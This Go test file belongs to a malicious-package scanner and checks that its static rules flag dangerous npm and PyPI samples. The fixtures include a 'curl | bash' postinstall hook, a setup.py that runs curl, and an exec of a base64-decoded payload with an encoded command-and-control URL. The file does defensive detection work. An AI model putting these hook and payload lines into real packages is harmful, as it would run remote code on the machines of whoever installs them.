package static

import (
	"testing"

	"github.com/joncooper/detonator/internal/artifact"
	"github.com/joncooper/detonator/internal/verdict"
)

func unpacked(files map[string]string) *artifact.Unpacked {
	u := &artifact.Unpacked{}
	for p, c := range files {
		u.Files = append(u.Files, artifact.File{Path: p, Content: []byte(c), Size: int64(len(c))})
	}
	return u
}

func hasRule(sigs []verdict.Signal, rule string) *verdict.Signal {
	for i := range sigs {
		if sigs[i].Rule == rule {
			return &sigs[i]
		}
	}
	return nil
}

func TestNPMMaliciousPostinstall(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "evil", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"evil","scripts":{"postinstall":"curl http://1.2.3.4/x | bash"}}`,
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "npm-install-hook-danger")
	if s == nil || s.Severity != verdict.SevCritical {
		t.Fatalf("want critical npm-install-hook-danger, got %+v", sigs)
	}
}

func TestNPMBenignInstallHookIsLow(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "native", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"native","scripts":{"install":"node-gyp rebuild"}}`,
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "npm-install-hook")
	if s == nil || s.Severity != verdict.SevLow {
		t.Fatalf("want low npm-install-hook, got %+v", sigs)
	}
}

func TestNPMNoScriptsNoSignal(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "clean", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"clean","version":"1.0.0"}`,
		"index.js":     `module.exports = 42;`,
	})
	if sigs := Analyze(art, u); len(sigs) != 0 {
		t.Fatalf("clean package produced signals: %+v", sigs)
	}
}

func TestPySetupExecutionWithNetworkIsCritical(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "evil", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"setup.py": "import subprocess\nsubprocess.run(['curl','http://1.2.3.4'])\nfrom setuptools import setup\nsetup(name='evil')",
	})
	sigs := Analyze(art, u)
	s := hasRule(sigs, "py-setup-execution")
	if s == nil || s.Severity != verdict.SevCritical {
		t.Fatalf("want critical py-setup-execution, got %+v", sigs)
	}
}

func TestDynamicExecOfDecodedPayload(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "evil", Version: "1.0.0"}
	// The telnyx-style payload: exec of base64-decoded content, plus a base64
	// literal that decodes to a hidden C2 URL.
	c2b64 := "aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg==" // http://83.142.209.203:8080/hangup.wav
	u := unpacked(map[string]string{
		"pkg/client.py": "import base64\nx = base64.b64decode('" + c2b64 + "')\nexec(base64.b64decode(payload))\n",
	})
	got := hasRuleSet(Analyze(art, u))
	if got["dynamic-exec-decoded"] != verdict.SevCritical {
		t.Fatalf("want critical dynamic-exec-decoded, got %+v", got)
	}
	if got["encoded-network-indicator"] != verdict.SevHigh {
		t.Fatalf("want high encoded-network-indicator, got %+v", got)
	}
}

func TestBenignBase64NotFlaggedAsC2(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "ok", Version: "1.0.0"}
	// A base64 blob that decodes to binary (not a URL) must not trip the C2 rule.
	u := unpacked(map[string]string{
		"package.json": `{"name":"ok"}`,
		"data.js":      "const img = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAgAAAA';\n",
	})
	if hasRule(Analyze(art, u), "encoded-network-indicator") != nil {
		t.Fatal("benign base64 wrongly flagged as encoded C2")
	}
}

func hasRuleSet(sigs []verdict.Signal) map[string]verdict.Severity {
	m := map[string]verdict.Severity{}
	for _, s := range sigs {
		m[s.Rule] = s.Severity
	}
	return m
}

func TestSecretDetection(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "leaky", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"leaky"}`,
		"key.pem":      "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----",
	})
	sigs := Analyze(art, u)
	if hasRule(sigs, "embedded-private-key") == nil {
		t.Fatalf("private key not detected: %+v", sigs)
	}
}
